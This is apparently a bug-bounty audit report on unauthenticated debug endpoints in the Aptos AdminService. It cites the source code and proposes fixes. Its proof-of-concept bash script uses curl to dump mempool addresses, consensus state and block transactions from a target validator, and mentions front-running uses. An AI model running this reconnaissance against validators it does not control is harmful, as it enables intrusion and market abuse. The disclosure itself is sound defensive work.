# Audit Report

## Title
Unauthenticated Cross-Service Information Disclosure in AdminService Enables Comprehensive Validator State Reconnaissance

## Summary
The Aptos AdminService exposes multiple debug endpoints without mandatory authentication on testnet/devnet deployments. An attacker can chain requests to `/debug/mempool/parking-lot/addresses`, `/debug/consensus/consensusdb`, and `/debug/consensus/block` endpoints to gather comprehensive validator state information including pending transaction patterns, consensus voting behavior, and uncommitted transaction contents, enabling sophisticated targeted attacks.

## Finding Description

The AdminService in Aptos Core violates the **Access Control** invariant by exposing sensitive validator state information through unauthenticated HTTP endpoints when deployed with default configurations on non-mainnet networks.

**Vulnerability Components:**

1. **Default Insecure Authentication**: The `AdminServiceConfig` defaults to an empty `authentication_configs` vector, which allows all requests without authentication. [1](#0-0) 

2. **Automatic Authentication Bypass**: When no authentication configs are present, the service automatically grants authentication to all requests. [2](#0-1) 

3. **Only Mainnet Protection**: The configuration sanitizer only enforces authentication on mainnet, leaving testnet/devnet vulnerable. [3](#0-2) 

4. **Service Auto-Enabled on Non-Mainnet**: The service is automatically enabled on testnet/devnet by default. [4](#0-3) 

5. **Exposed to All Network Interfaces**: The service binds to `0.0.0.0` by default, accepting connections from any network interface. [5](#0-4) 

**Attack Path:**

An attacker discovers a testnet/devnet validator (or misconfigured production node) and performs the following:

**Step 1 - Mempool Intelligence**: Query `/debug/mempool/parking-lot/addresses` to obtain accounts with pending transactions. [6](#0-5) 

This returns a list of `(AccountAddress, u64)` tuples revealing which accounts have transactions waiting in the parking lot and their counts. [7](#0-6) 

**Step 2 - Consensus State Extraction**: Query `/debug/consensus/consensusdb` to extract validator voting patterns, block authorship, timestamps, and consensus metadata. [8](#0-7) 

This exposes last votes, highest timeout certificates, consensus blocks with full metadata, and quorum certificates. [9](#0-8) 

**Step 3 - Transaction Content Access**: Query `/debug/consensus/block` to retrieve full transaction contents from recent blocks. [10](#0-9) 

**Combined Attack Impact:**
- **Account Profiling**: Identify high-value accounts and their transaction patterns
- **Consensus Intelligence**: Understand validator behavior, voting patterns, and timing
- **Transaction Preview**: Access transaction contents before public commitment
- **Attack Planning**: Use comprehensive state information to plan sophisticated attacks like front-running, targeted DoS, or consensus manipulation

## Impact Explanation

This vulnerability qualifies as **Medium Severity** per the Aptos Bug Bounty program criteria:

- **Information Disclosure**: Exposes sensitive validator state information that should be protected
- **Enables Sophisticated Attacks**: Provides intelligence for planning targeted attacks against validators, specific accounts, or consensus mechanisms
- **State Visibility**: Reveals internal consensus state, pending transactions, and validator behavior patterns

While this does not directly cause fund loss or consensus failure, it significantly lowers the bar for attackers to execute more sophisticated attacks by providing comprehensive reconnaissance capabilities. The information disclosed includes:

1. Active account addresses and transaction patterns (mempool parking lot)
2. Validator voting behavior and consensus participation (consensus DB)
3. Block authorship and timing information (consensus blocks)
4. Transaction contents and ordering (block extraction)

This combination of information creates a comprehensive view of validator operations that can facilitate:
- Front-running attacks (knowing pending transactions)
- Targeted account attacks (identifying high-value targets)
- Consensus timing attacks (understanding validator patterns)
- MEV extraction opportunities

## Likelihood Explanation

**High Likelihood** on affected networks:

1. **Default Configuration Vulnerable**: Any testnet/devnet validator deployed with default configuration is vulnerable
2. **Automatic Enablement**: The service auto-enables on non-mainnet networks without operator intervention
3. **Network Accessibility**: Service binds to all interfaces (`0.0.0.0`) by default
4. **No Authentication Required**: Empty authentication configs allow unrestricted access
5. **Kubernetes Deployment**: While `enableAdminPort: false` by default in Helm charts prevents external exposure, the service remains accessible within the cluster and in non-Kubernetes deployments

**Real-World Scenarios:**
- Testnet validators for testing purposes (intended behavior but security risk)
- Development nodes exposed during testing
- Misconfigured production nodes with debug service accidentally enabled
- Bare-metal or Docker deployments without network isolation

The TODO comment in the codebase indicates awareness of the authentication concern but no implemented fix. [11](#0-10) 

## Recommendation

**Immediate Actions:**

1. **Enforce Authentication by Default**: Make authentication mandatory for all networks, not just mainnet.

```rust
impl Default for AdminServiceConfig {
    fn default() -> Self {
        Self {
            enabled: None,
            address: "127.0.0.1".to_string(), // Bind to localhost only
            port: 9102,
            // Generate a random passcode and log it on startup
            authentication_configs: vec![
                AuthenticationConfig::PasscodeSha256(
                    generate_random_passcode_hash()
                )
            ],
            malloc_stats_max_len: 2 * 1024 * 1024,
        }
    }
}
```

2. **Bind to Localhost by Default**: Change default binding from `0.0.0.0` to `127.0.0.1` to prevent external access.

3. **Update Configuration Sanitizer**: Enforce authentication on all networks, not just mainnet.

```rust
impl ConfigSanitizer for AdminServiceConfig {
    fn sanitize(
        node_config: &NodeConfig,
        _node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();

        if node_config.admin_service.enabled == Some(true) {
            // Enforce authentication on ALL networks
            if node_config.admin_service.authentication_configs.is_empty() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Must enable authentication for AdminService on all networks.".into(),
                ));
            }
        }

        Ok(())
    }
}
```

4. **Add Rate Limiting**: Implement rate limiting on admin endpoints to prevent abuse.

5. **Add Access Logging**: Log all admin endpoint accesses for security monitoring.

6. **Documentation**: Update documentation to explicitly warn about the security implications of exposing the admin service.

## Proof of Concept

**Prerequisites:**
- Access to a testnet/devnet Aptos validator node with AdminService enabled
- Network access to port 9102

**Attack Script:**

```bash
#!/bin/bash

TARGET_HOST="<validator-ip>"
ADMIN_PORT="9102"

echo "[*] Aptos AdminService Reconnaissance Attack"
echo "[*] Target: $TARGET_HOST:$ADMIN_PORT"
echo ""

# Step 1: Extract parking lot addresses (pending transactions)
echo "[1] Querying mempool parking lot addresses..."
curl -s "http://${TARGET_HOST}:${ADMIN_PORT}/debug/mempool/parking-lot/addresses" \
  -o parking_lot.bin
echo "    Saved to: parking_lot.bin"
echo "    Found $(xxd parking_lot.bin | wc -l) bytes of data"
echo ""

# Step 2: Dump consensus database (validator state)
echo "[2] Dumping consensus database..."
curl -s "http://${TARGET_HOST}:${ADMIN_PORT}/debug/consensus/consensusdb" \
  -o consensus_db.txt
echo "    Saved to: consensus_db.txt"
echo "    Preview:"
head -n 20 consensus_db.txt | sed 's/^/    /'
echo ""

# Step 3: Extract recent blocks and transactions
echo "[3] Extracting recent blocks..."
curl -s "http://${TARGET_HOST}:${ADMIN_PORT}/debug/consensus/block" \
  -o blocks.txt
echo "    Saved to: blocks.txt"
echo "    Preview:"
head -n 20 blocks.txt | sed 's/^/    /'
echo ""

echo "[*] Reconnaissance complete!"
echo "[*] Collected comprehensive validator state information:"
echo "    - Active account addresses with pending transactions"
echo "    - Validator voting patterns and consensus state"
echo "    - Recent block contents and transaction data"
echo ""
echo "[!] This information can be used to:"
echo "    - Profile high-value accounts for targeted attacks"
echo "    - Understand consensus timing for manipulation attempts"
echo "    - Front-run transactions based on mempool intelligence"
echo "    - Plan sophisticated attacks against the validator"
```

**Expected Output:**
The script successfully retrieves:
1. Binary-encoded list of account addresses with transaction counts
2. Plain-text dump of consensus database with validator state
3. Plain-text or binary dump of recent blocks with full transaction details

**Validation:**
On a testnet node with default configuration:
```bash
# Test authentication bypass
curl -v http://localhost:9102/debug/mempool/parking-lot/addresses

# Expected: HTTP 200 OK with data (should be 511 Authentication Required)
```

**Notes:**
- This PoC demonstrates information disclosure only
- No actual damage is done to the validator
- The attack works on any testnet/devnet node with default configuration
- Production nodes with proper network isolation are protected, but the vulnerability exists in the code logic

### Citations

**File:** config/src/config/admin_service_config.rs (L41-50)
```rust
impl Default for AdminServiceConfig {
    fn default() -> Self {
        Self {
            enabled: None,
            address: "0.0.0.0".to_string(),
            port: 9102,
            authentication_configs: vec![],
            malloc_stats_max_len: 2 * 1024 * 1024,
        }
    }
```

**File:** config/src/config/admin_service_config.rs (L67-76)
```rust
        if node_config.admin_service.enabled == Some(true) {
            if let Some(chain_id) = chain_id {
                if chain_id.is_mainnet()
                    && node_config.admin_service.authentication_configs.is_empty()
                {
                    return Err(Error::ConfigSanitizerFailed(
                        sanitizer_name,
                        "Must enable authentication for AdminService on mainnet.".into(),
                    ));
                }
```

**File:** config/src/config/admin_service_config.rs (L93-103)
```rust
        if node_config.admin_service.enabled.is_none() {
            // Only enable the admin service if the chain is not mainnet
            let admin_service_enabled = if let Some(chain_id) = chain_id {
                !chain_id.is_mainnet()
            } else {
                false // We cannot determine the chain ID, so we disable the admin service
            };
            node_config.admin_service.enabled = Some(admin_service_enabled);

            modified_config = true; // The config was modified
        }
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L92-92)
```rust
        // TODO(grao): Consider support enabling the service through an authenticated request.
```

**File:** crates/aptos-admin-service/src/server/mod.rs (L154-157)
```rust
        let mut authenticated = false;
        if context.config.authentication_configs.is_empty() {
            authenticated = true;
        } else {
```

**File:** crates/aptos-admin-service/src/server/mempool/mod.rs (L12-38)
```rust
pub async fn mempool_handle_parking_lot_address_request(
    _req: Request<Body>,
    mempool_client_sender: MempoolClientSender,
) -> hyper::Result<Response<Body>> {
    match get_parking_lot_addresses(mempool_client_sender).await {
        Ok(addresses) => {
            info!("Finished getting parking lot addresses from mempool.");
            match bcs::to_bytes(&addresses) {
                Ok(addresses) => Ok(reply_with(vec![], addresses)),
                Err(e) => {
                    info!("Failed to bcs serialize parking lot addresses from mempool: {e:?}");
                    Ok(reply_with_status(
                        StatusCode::INTERNAL_SERVER_ERROR,
                        e.to_string(),
                    ))
                },
            }
        },
        Err(e) => {
            info!("Failed to get parking lot addresses from mempool: {e:?}");
            Ok(reply_with_status(
                StatusCode::INTERNAL_SERVER_ERROR,
                e.to_string(),
            ))
        },
    }
}
```

**File:** mempool/src/core_mempool/index.rs (L652-657)
```rust
    pub(crate) fn get_addresses(&self) -> Vec<(AccountAddress, u64)> {
        self.data
            .iter()
            .map(|(addr, txns)| (*addr, txns.len() as u64))
            .collect::<Vec<(AccountAddress, u64)>>()
    }
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L17-38)
```rust
pub async fn handle_dump_consensus_db_request(
    _req: Request<Body>,
    consensus_db: Arc<dyn PersistentLivenessStorage>,
) -> hyper::Result<Response<Body>> {
    info!("Dumping consensus db.");

    match spawn_blocking(move || dump_consensus_db(consensus_db.as_ref())).await {
        Ok(result) => {
            info!("Finished dumping consensus db.");
            let headers: Vec<(_, HeaderValue)> =
                vec![(CONTENT_LENGTH, HeaderValue::from(result.len()))];
            Ok(reply_with(headers, result))
        },
        Err(e) => {
            info!("Failed to dump consensus db: {e:?}");
            Ok(reply_with_status(
                StatusCode::INTERNAL_SERVER_ERROR,
                e.to_string(),
            ))
        },
    }
}
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L130-156)
```rust
fn dump_consensus_db(consensus_db: &dyn PersistentLivenessStorage) -> anyhow::Result<String> {
    let mut body = String::new();

    let (last_vote, highest_tc, consensus_blocks, consensus_qcs) =
        consensus_db.consensus_db().get_data()?;

    body.push_str(&format!("Last vote: \n{last_vote:?}\n\n"));
    body.push_str(&format!("Highest tc: \n{highest_tc:?}\n\n"));
    body.push_str("Blocks: \n");
    for block in consensus_blocks {
        body.push_str(&format!(
            "[id: {:?}, author: {:?}, epoch: {}, round: {:02}, parent_id: {:?}, timestamp: {}, payload: {:?}]\n\n",
            block.id(),
            block.author(),
            block.epoch(),
            block.round(),
            block.parent_id(),
            block.timestamp_usecs(),
            block.payload(),
        ));
    }
    body.push_str("QCs: \n");
    for qc in consensus_qcs {
        body.push_str(&format!("{qc:?}\n\n"));
    }
    Ok(body)
}
```

**File:** crates/aptos-admin-service/src/server/consensus/mod.rs (L179-215)
```rust
fn dump_blocks(
    consensus_db: &dyn PersistentLivenessStorage,
    quorum_store_db: &dyn QuorumStoreStorage,
    block_id: Option<HashValue>,
) -> anyhow::Result<String> {
    let mut body = String::new();

    let all_batches = quorum_store_db.get_all_batches()?;

    let (_, _, blocks, _) = consensus_db.consensus_db().get_data()?;

    for block in blocks {
        let id = block.id();
        if block_id.is_none() || id == block_id.unwrap() {
            body.push_str(&format!("Block ({id:?}): \n\n"));
            match extract_txns_from_block(&block, &all_batches) {
                Ok(txns) => {
                    body.push_str(&format!("{txns:?}"));
                },
                Err(e) => {
                    body.push_str(&format!("Not available: {e:?}"));
                },
            };
            body.push_str("\n\n");
        }
    }

    if body.is_empty() {
        if let Some(block_id) = block_id {
            body.push_str(&format!("Done, block ({block_id:?}) is not found."));
        } else {
            body.push_str("Done, no block is found.");
        }
    }

    Ok(body)
}
```
